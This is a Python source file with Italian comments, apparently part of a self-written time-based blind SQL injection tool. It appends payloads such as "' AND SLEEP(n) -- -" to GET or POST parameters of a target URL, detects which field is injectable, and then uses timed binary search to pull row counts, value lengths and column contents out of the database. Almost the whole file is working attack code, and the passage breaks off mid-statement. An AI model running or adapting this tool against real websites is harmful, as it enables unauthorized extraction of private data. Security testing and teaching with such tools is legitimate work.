import parseOptions
import OptionConfiguration
import requests
import time
import informationSchema
import sys


# funzione crea metodo da attaccare all'url
def creaStringaGet(dataToSent):
    """Crea la stringa da attaccare all'url per
        una richiesta get"""
    stringa=""
    for i in range(len(OptionConfiguration.key)):
        stringa=stringa + OptionConfiguration.key[i]+"="+dataToSent[OptionConfiguration.key[i]]
        #se vi sono ancora campi da stampare li attacco
        if(i+1!=len(OptionConfiguration.key)):
            stringa=stringa+" & "
    return stringa

def checkVariableInjectable():

    """Controlla se i parametri selezionati attraverso il
    metodo scelto sono injectable attraverso Time-Based Blind SQLi
    controlla quale e' la variabile injectabile al time-based blind sqli
    e di che tipo e', il primo toravto viene selelzionato per l'attacco"""

    # innanzitutto calcolo il tempo medio su cinque richieste alla stessa pagina
    timeConnessione=[]
    for i in range(5):
        start=time.time()
        req=requests.post("%s"%(OptionConfiguration.destination[0]))
        req.content
        end=time.time()
        timeConnessione.append(end-start)


    OptionConfiguration.tempoMedioConnessione=sum(timeConnessione)/5
    tempoMassimo=max(timeConnessione)
    # ottimizzo il tempo di connessione
    OptionConfiguration.timeToWait=int(tempoMassimo*5)+2;
    #OptionConfiguration.timeToWait=int(tempoMassimo*30)+1
    #print (OptionConfiguration.timeToWait);
    # il metodo di invio scelto e il POST

    if OptionConfiguration.methodSentData=="POST" :

        for key in OptionConfiguration.key:

            dataToSent=OptionConfiguration.data.copy()
            dataToSent[key]=dataToSent[key]+ " AND SLEEP(%s)"%(OptionConfiguration.timeToWait)
            #print dataToSent
            start=time.time()
            re=requests.post("%s"%OptionConfiguration.destination[0],data=dataToSent)
            re.content
            end=time.time()

            if((end-start)>=OptionConfiguration.timeToWait):

                #print("The field '%s' appear injectable on Time-Based Blind SQLi (value int)"%(key))
                start = time.time()
                re = requests.post("%s" % OptionConfiguration.destination[0], data=dataToSent)
                re.content
                end = time.time()

                if((end-start)>=OptionConfiguration.timeToWait):

                    OptionConfiguration.valueInjectable=key;
                    OptionConfiguration.typeOfValue="int"
                    return True;

            else:

                #controllare se invece devo aggiunger un '
                dataToSent = OptionConfiguration.data.copy()
                dataToSent[key] = dataToSent[key] + "' AND SLEEP(%s) -- -"%(OptionConfiguration.timeToWait)
                # print dataToSent
                start = time.time()
                re = requests.post("%s" % OptionConfiguration.destination[0], data=dataToSent)
                re.content
                end = time.time()

                if((end-start)>=OptionConfiguration.timeToWait):

                    #print("The field '%s' appear injectable on Time Based Blind SQLi (value string)" % (key))
                    start = time.time()
                    re = requests.post("%s" % OptionConfiguration.destination[0], data=dataToSent)
                    re.content
                    end = time.time()

                    if ((end - start) >= OptionConfiguration.timeToWait):

                        OptionConfiguration.valueInjectable=key
                        OptionConfiguration.typeOfValue="string"
                        return True;

        return False;

    #metodo di invio e il get
    elif OptionConfiguration.methodSentData == "GET":
        for key in OptionConfiguration.key:
            dataToSent = OptionConfiguration.data.copy()
            dataToSent[key] = dataToSent[key] + " AND SLEEP(%s)"%(OptionConfiguration.timeToWait)

            # essendo in get attacco i dati all'url
            data=creaStringaGet(dataToSent)
            #print (data)
            start = time.time()
            re = requests.get("%s?%s" %(OptionConfiguration.destination[0],data))
            re.content
            end = time.time()
            if (end - start >= OptionConfiguration.timeToWait):
                #print("The field '%s' appear injectable on Time Based Blind SQLi (value int)" % (key))
                OptionConfiguration.valueInjectable = key;
                OptionConfiguration.typeOfValue="int"
                return True;

            else:
                #controllo se il campo e' una stringa
                #controllare se invece devo aggiunger un '
                dataToSent = OptionConfiguration.data.copy()
                dataToSent[key] = dataToSent[key] + "' AND SLEEP(%s) -- -"%(OptionConfiguration.timeToWait)
                data = creaStringaGet(dataToSent)
                # print dataToSent
                start = time.time()
                re = requests.get("%s?%s" % (OptionConfiguration.destination[0], data))
                re.content
                end = time.time()
                # se e una stringa il campo come posso fare?
                if(end-start>=OptionConfiguration.timeToWait):
                    #print("The field '%s' appear injectable on Time Based Blind SQLi (value string)" % (key))
                    OptionConfiguration.valueInjectable = key;
                    OptionConfiguration.typeOfValue = "string"
                    return True;

        return False;
    else:

        print (OptionConfiguration.bcolors.BOLD+OptionConfiguration.bcolors.FAIL+
               "Method to send data does not exist"+OptionConfiguration.bcolors.ENDC)

        parseOptions.help()
        return False;

def countValueofTablePost(nameTable,condizioneWhere):

    trovato=False
    min=0
    max=512
    print"Loading",
    if (OptionConfiguration.typeOfValue == "string"):
        while(trovato==False):
            if(min<=max):

                dataToSent = OptionConfiguration.data.copy()
                print".",
                #se esiste la condizione where o meno
                if(condizioneWhere==None):
                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                  "' AND (SELECT COUNT(*) FROM %s ) > %s " % (
                                                                      nameTable, max) + \
                                                                  " AND SLEEP(%s) -- -" % (
                                                                  OptionConfiguration.timeToWait)
                else:
                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      "' AND (SELECT COUNT(*) FROM %s WHERE %s ) > %s " % (
                                                                          nameTable,condizioneWhere, max) + \
                                                                      " AND SLEEP(%s) -- -" % (OptionConfiguration.timeToWait)

                start = time.time()
                req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                end = time.time()

                #se succede allora il numero di righe e maggiore del massimo che ho impostato quindi
                # devo cambiare gli estremi di ricerca
                if ((end - start) >= OptionConfiguration.timeToWait):
                    min = max + 1
                    max=max*2 +1

                else:

                    mid= min + int((max-min)//2)
                    dataToSent = OptionConfiguration.data.copy()

                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                              "' AND (SELECT COUNT(*) FROM %s ) = %s " % (
                                                              nameTable, mid) + \
                                                              " AND SLEEP(%s) -- -" % (OptionConfiguration.timeToWait)
                    else:

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (SELECT COUNT(*) FROM %s WHERE %s ) = %s " % (
                                                                              nameTable, condizioneWhere, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                          OptionConfiguration.timeToWait)

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()

#                    print (end, start,mid)
                    #se succede questo allora lo abbiamo trovato
                    if((end-start)>= OptionConfiguration.timeToWait):

                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()
                        # controllo solo che non sia stato un ritardo di connessione
                        # se non lo e stato allora e sicuramenre il valore trovato

                        if((end-start)>=OptionConfiguration.timeToWait):

                            trovato=True
                            return mid;


                    # se non lo e allora cerco di capire quanti sono i vlaori
                    dataToSent = OptionConfiguration.data.copy()

                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable]=dataToSent[OptionConfiguration.valueInjectable]+\
                                                            "' AND (SELECT COUNT(*) FROM %s ) > %s "%(nameTable,mid)+\
                                                            " AND SLEEP(%s) -- -" %(OptionConfiguration.timeToWait)

                    else:

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (SELECT COUNT(*) FROM %s WHERE %s ) > %s " % (
                                                                              nameTable, condizioneWhere, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                          OptionConfiguration.timeToWait)

                    start=time.time()
                    req=requests.post("%s"%(OptionConfiguration.destination[0]),dataToSent)
                    req.content
                    end=time.time()

                    #sono nella ,eta superiore
                    if((end-start) >= OptionConfiguration.timeToWait):
                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            min=mid+1

                    #sono nella meta inferiore
                    else:
                        max=mid-1
            else:
                print (OptionConfiguration.bcolors.BOLD+OptionConfiguration.bcolors.FAIL+"Error please try again"+OptionConfiguration.bcolors.ENDC)
                break

    #allora e un intero
    else:
        while (trovato==False):

            if (min <= max):
                print".",
                dataToSent = OptionConfiguration.data.copy()

                if(condizioneWhere==None):

                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      " AND ( SELECT COUNT(*) FROM %s ) > %s " % (nameTable, max) + \
                                                                      " AND SLEEP(%s)" %(OptionConfiguration.timeToWait)


                else:

                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      " AND ( SELECT COUNT(*) FROM %s WHERE %s ) > %s " % (
                                                                          nameTable, condizioneWhere, max) + \
                                                                      " AND SLEEP(%s) " % (
                                                                      OptionConfiguration.timeToWait)

                start = time.time()
                req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                #print (dataToSent[OptionConfiguration.valueInjectable])
                req.content
                end = time.time()
                # se succede allora il numero di righe e' maggiore del massimo che ho impostato quindi
                # devo cambiare gli estremi di ricerca
                if ((end - start) >= OptionConfiguration.timeToWait):

                    min = max+1
                    max = max * 2 +1

                else:

                    mid = min+int((max-min) // 2)
                    dataToSent = OptionConfiguration.data.copy()

                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                  " AND ( SELECT COUNT(*) FROM %s ) = %s " % (
                                                                      nameTable, mid) + \
                                                                  " AND SLEEP(%s)" %(OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND ( SELECT COUNT(*) FROM %s WHERE %s ) = %s " % (
                                                                              nameTable, condizioneWhere, mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                    #print (dataToSent[OptionConfiguration.valueInjectable])

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()

                    #print (mid,end-start,max,min)
                    # se succede questo allora lo abbiamo trovato

                    if ((end - start )>= OptionConfiguration.timeToWait):

                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()

                        if((end-start)>=OptionConfiguration.timeToWait):

                            trovato = True
                            return mid;

                    dataToSent = OptionConfiguration.data.copy()

                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                  " AND ( SELECT COUNT(*) FROM %s ) > %s " % (
                                                                  nameTable, mid) + \
                                                                  " AND SLEEP(%s) "%(OptionConfiguration.timeToWait)
                    else:

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND ( SELECT COUNT(*) FROM %s WHERE %s ) > %s " % (
                                                                              nameTable, condizioneWhere, mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    #print (dataToSent[OptionConfiguration.valueInjectable])
                    end = time.time()
                    #print (end-start)
                    # sono nella ,eta superiore

                    if ((end - start) >= OptionConfiguration.timeToWait):

                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):

                            min = mid + 1
                    # sono nella meta inferiore
                    else:
                        max = mid-1
            else:
                print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error please try again" + OptionConfiguration.bcolors.ENDC)
                break

def countValueofTableGet(nameTable,condizioneWhere):

    trovato=False
    min=0
    max=512
    print"Loading",
    if (OptionConfiguration.typeOfValue == "string"):
        while(trovato==False):
            if(min<=max):

                print ".",
                dataToSent = OptionConfiguration.data.copy()
                if(condizioneWhere==None):

                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                              "' AND ( SELECT COUNT(*) FROM %s ) > %s " % (
                                                              nameTable, max) + \
                                                              " AND SLEEP(%s) -- -" % (OptionConfiguration.timeToWait)
                else:

                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      "' AND ( SELECT COUNT(*) FROM %s WHERE %s ) > %s " % (
                                                                          nameTable, condizioneWhere, max) + \
                                                                      " AND SLEEP(%s) -- -" % (
                                                                      OptionConfiguration.timeToWait)

                dataSent=creaStringaGet(dataToSent)
                start = time.time()
                req = requests.get("%s?%s" % (OptionConfiguration.destination[0],dataSent), dataToSent)
                req.content
                end = time.time()
                #print(end-start,max,"max")
                #se succede questo allora dobbiamo cambiare gli estremi di configurazione
                if((end-start)>=OptionConfiguration.timeToWait):

                    min=max+1
                    max=max*2+1

                else:

                    mid= min+int((max-min)//2)

                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                              "' AND ( SELECT COUNT(*) FROM %s ) = %s " % (
                                                              nameTable, mid) + \
                                                              " AND SLEEP(%s) -- -" % (OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND ( SELECT COUNT(*) FROM %s WHERE %s ) = %s " % (
                                                                              nameTable, condizioneWhere, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                    dataSent=creaStringaGet(dataToSent)
                    #print (dataSent)
                    start = time.time()
                    req = requests.get("%s?%s" % (OptionConfiguration.destination[0],dataSent), dataToSent)
                    req.content

                    end = time.time()

                    #print (end-start,req.elapsed.total_seconds(),mid)
                    #se succede questo allora lo abbiamo trovato

                    if((end-start)>=OptionConfiguration.timeToWait):

                        dataSent = creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent), dataToSent)
                        req.content
                        end = time.time()

                        # se succede questo allora lo abbiamo trovato
                        if ((end - start) >= OptionConfiguration.timeToWait):

                            trovato=True
                            return mid;

                    # altrimenti scelgo la meta giusta
                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable]=dataToSent[OptionConfiguration.valueInjectable]+\
                                                            "' AND ( SELECT COUNT(*) FROM %s ) > %s "%(nameTable,mid)+\
                                                            " AND SLEEP(%s) -- -" %(OptionConfiguration.timeToWait)
                    else:

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND ( SELECT COUNT(*) FROM %s WHERE %s ) > %s " % (
                                                                              nameTable, condizioneWhere, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                    start=time.time()
                    req=requests.get("%s?%s"%(OptionConfiguration.destination[0],dataToSent))
                    req.content
                    end=time.time()
                    #print (dataToSent[OptionConfiguration.valueInjectable])
                    #sono nella ,eta superiore
                    dataSent=creaStringaGet(dataToSent)
                    #print (dataSent,end-start)
                    if((end-start)>=OptionConfiguration.timeToWait):

                        start = time.time()
                        req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent))
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):

                            min=mid+1
                        #sono nella meta inferiore
                    else:
                        max=mid-1
            else:
                print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error value not found" + OptionConfiguration.bcolors.ENDC)
                trovato=False
                break

    # e un intero
    else:
        while (trovato == False):
            if (min <= max):
                print ".cc",
                dataToSent = OptionConfiguration.data.copy()
                if(condizioneWhere==None):

                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                  " AND ( SELECT COUNT(*) FROM %s ) > %s " % (nameTable, max) + \
                                                                  " AND SLEEP(%s) " % (OptionConfiguration.timeToWait)
                else:

                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      " AND ( SELECT COUNT(*) FROM %s WHERE %s ) > %s " % (
                                                                          nameTable, condizioneWhere, max) + \
                                                                      " AND SLEEP(%s) " % (
                                                                          OptionConfiguration.timeToWait)

                dataSent = creaStringaGet(dataToSent)
                start = time.time()
                req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent), dataToSent)
                req.content
                end = time.time()
                # print (end - start, min, max)
                # dobbiamo cambiare gli estremi di scelti
                # siccome siamo maggiore del massimo
                if ((end - start) >= OptionConfiguration.timeToWait):

                    min = max + 1
                    max=max*2+1

                else:

                    mid= min+int((max-min)//2)
                    dataToSent = OptionConfiguration.data.copy()

                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                  " AND (SELECT COUNT(*) FROM %s ) = %s " % (
                                                                      nameTable, mid) + \
                                                                  " AND SLEEP(%s) " % (
                                                                  OptionConfiguration.timeToWait)
                    else:

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (SELECT COUNT(*) FROM %s WHERE %s ) = %s " % (
                                                                              nameTable, condizioneWhere, mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                    dataSent = creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent), dataToSent)
                    req.content
                    end = time.time()
                    #print (end - start, min, max)
                    # se succede questo allora lo abbiamo trovato

                    if ((end - start) >= OptionConfiguration.timeToWait):

                        dataSent = creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent), dataToSent)
                        req.content
                        end = time.time()
                        # print (end - start, min, max)
                        # se succede questo allora lo abbiamo trovato

                        if ((end - start) >= OptionConfiguration.timeToWait):

                            trovato=True
                            return mid;

                    dataToSent = OptionConfiguration.data.copy()

                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      " AND (SELECT COUNT(*) FROM %s ) > %s " % (
                                                                      nameTable, mid) + \
                                                                      " AND SLEEP(%s)" % (
                                                                      OptionConfiguration.timeToWait)
                    else:

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (SELECT COUNT(*) FROM %s WHERE %s ) > %s " % (
                                                                              nameTable, condizioneWhere, mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                    start = time.time()
                    dataSent=creaStringaGet(dataSent)
                    req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent))
                    req.content
                    end = time.time()
                    # sono nella ,eta superiore

                    if ((end - start) >= OptionConfiguration.timeToWait):

                        start = time.time()
                        dataSent = creaStringaGet(dataSent)
                        req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent))
                        req.content
                        end = time.time()

                        if ((end - start) >= OptionConfiguration.timeToWait):

                            min = mid + 1
                    # sono nella meta inferiore

                    else:

                        max = mid-1

            else:
                print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error please try again" + OptionConfiguration.bcolors.ENDC)
                trovato=False
                break

def searchValueofTablePost(numeroRighe,nomeTabella,nomeColonna,condizioneWhere):

    valori=[]
    #trovo i valori per ogni riga della colonna selzionata

    for i in range(numeroRighe):

        trovato = False
        min = 0
        max = 256
        length=0

        #calcolo della lunghezza della parola
        if (OptionConfiguration.typeOfValue == "string"):
            while (trovato == False):
                if (min <= max):
                    mid = min+int((max-min) // 2)
                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      "' AND (SELECT LENGTH(%s) FROM %s LIMIT %s,1 ) = %s " % (
                                                                          nomeColonna,nomeTabella,i, mid) + \
                                                                      " AND SLEEP(%s) -- -" % (
                                                                      OptionConfiguration.timeToWait)

                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (SELECT LENGTH(%s) FROM %s  WHERE %s LIMIT %s,1 ) = %s " % (
                                                                              nomeColonna, nomeTabella,condizioneWhere, i, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()
                    # se succede questo allora lo abbiamo trovato
                    if ((end - start) >= OptionConfiguration.timeToWait):
                        start=time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()
                        if((end-start)>=OptionConfiguration.timeToWait):
                            trovato = True
                            length= mid;
                            break

                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      "' AND (SELECT LENGTH(%s) FROM %s LIMIT %s,1  ) > %s " % (
                                                                      nomeColonna,nomeTabella,i, mid) + \
                                                                      " AND SLEEP(%s) -- -" % (
                                                                      OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (SELECT LENGTH(%s) FROM %s  WHERE %s LIMIT %s,1 ) > %s " % (
                                                                              nomeColonna, nomeTabella, condizioneWhere,
                                                                              i, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()

                    # sono nella ,eta superiore
                    if ((end - start )>= OptionConfiguration.timeToWait):
                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            min = mid + 1
                    # sono nella meta inferiore
                    else:
                        max = mid-1
                else:
                    break
        else:
            while (trovato == False):
                if (min <= max):
                    mid = min+int((max-min) // 2)
                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      " AND (SELECT LENGTH(%s) FROM %s LIMIT %s,1  ) = %s " % (
                                                                      nomeColonna,nomeTabella,i, mid) + \
                                                                      " AND SLEEP(%s)" % (
                                                                      OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (SELECT LENGTH(%s) FROM %s  WHERE %s LIMIT %s,1 ) = %s " % (
                                                                              nomeColonna, nomeTabella, condizioneWhere,
                                                                              i, mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()
                    #print (end-start),mid
                    # se succede questo allora lo abbiamo trovato
                    if ((end - start) > OptionConfiguration.timeToWait):
                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()
                        if ((end - start) >OptionConfiguration.timeToWait):
                            trovato = True
                            length= mid;
                            break



                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      " AND (SELECT LENGTH(%s) FROM %s LIMIT %s,1  ) > %s " % (
                                                                      nomeColonna,nomeTabella,i, mid) + \
                                                                      " AND SLEEP(%s) " % (
                                                                      OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (SELECT LENGTH(%s) FROM %s  WHERE %s LIMIT %s,1 ) > %s " % (
                                                                              nomeColonna, nomeTabella, condizioneWhere,
                                                                              i, mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()

                    # sono nella ,eta superiore
                    if ((end - start) >= OptionConfiguration.timeToWait):
                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            min = mid + 1
                    # sono nella meta inferiore
                    else:
                        max = mid-1
                else:
                    print (OptionConfiguration.bcolors.BOLD+OptionConfiguration.bcolors.FAIL+" Error value no find "+OptionConfiguration.bcolors.ENDC)
                    break

        # in questo punto conosco la varibaile length
        #print (length)
        # ora cerco tutti i caratteri  della stringa
        #print (length)
        for l in range(length):
            print "*",
        print ("")
        # senza thread
        #valori.append(ricostruisciParolaPOST(length,nomeTabella,nomeColonna,i,condizioneWhere))
        # con i thread
        value = threadStart(length, nomeTabella, nomeColonna, i, condizioneWhere)
        valori.append(value)
    return valori

def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere):

    # per ogni valore contenuto nella colonna
    # calcolo il numero di caratteri che ha
    # e il valore di ogni carattere
    #print ("num of rows  "+nomeColonna+" -> " + str(numeroRighe))
    valori=[]
    for i in range(numeroRighe):

        trovato = False
        min = 0
        max = 256
        # lunghezza della parola
        length = 0

        # calcolo della lunghezza della parola
        if (OptionConfiguration.typeOfValue == "string"):
            while (trovato == False):
                if (min <= max):
                    #print (min,max)
                    mid= min+int((max-min)//2)
                    dataToSent = OptionConfiguration.data.copy()
                    # modifico il valore injectable
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      "' AND ( SELECT LENGTH(%s) FROM %s LIMIT %s,1 ) = %s " % (
                                                                          nomeColonna, nomeTabella, i, mid) + \
                                                                      " AND SLEEP(%s) -- -" % (
                                                                          OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND ( SELECT LENGTH(%s) FROM %s WHERE %s LIMIT %s,1 ) = %s " % (
                                                                              nomeColonna, nomeTabella,condizioneWhere, i, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                    data=creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0],data), dataToSent)
                    req.content
                    end = time.time()

                    # se succede questo allora lo abbiamo trovato
                    if ((end - start) >= OptionConfiguration.timeToWait):
                        data = creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data), dataToSent)
                        req.content
                        end = time.time()

                        # se succede questo allora lo abbiamo trovato
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            trovato = True
                            length = mid;
                            break

                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      "' AND ( SELECT LENGTH(%s) FROM %s LIMIT %s,1  ) > %s " % (
                                                                          nomeColonna, nomeTabella, i, mid) + \
                                                                      " AND SLEEP(%s) -- -" % (
                                                                          OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND ( SELECT LENGTH(%s) FROM %s WHERE %s LIMIT %s,1 ) > %s " % (
                                                                              nomeColonna, nomeTabella,condizioneWhere, i, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                    data=creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0],data), dataToSent)
                    req.content
                    end = time.time()

                    # sono nella ,eta superiore
                    if ((end - start) >= OptionConfiguration.timeToWait):
                        data = creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data), dataToSent)
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            min = mid + 1
                    # sono nella meta inferiore
                    else:
                        max = mid-1
                else:
                    break
        else:
            while (trovato == False):
                if (min <= max):
                    mid= min+int((max-min)//2)
                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      " AND ( SELECT LENGTH(%s) FROM %s LIMIT %s,1  ) > %s " % (
                                                                          nomeColonna, nomeTabella, i, mid) + \
                                                                      " AND SLEEP(%s)" % (
                                                                       OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND ( SELECT LENGTH(%s) FROM %s WHERE %s LIMIT %s,1 ) > %s " % (
                                                                              nomeColonna, nomeTabella,condizioneWhere, i, mid) + \
                                                                          " AND SLEEP(%s)" % (
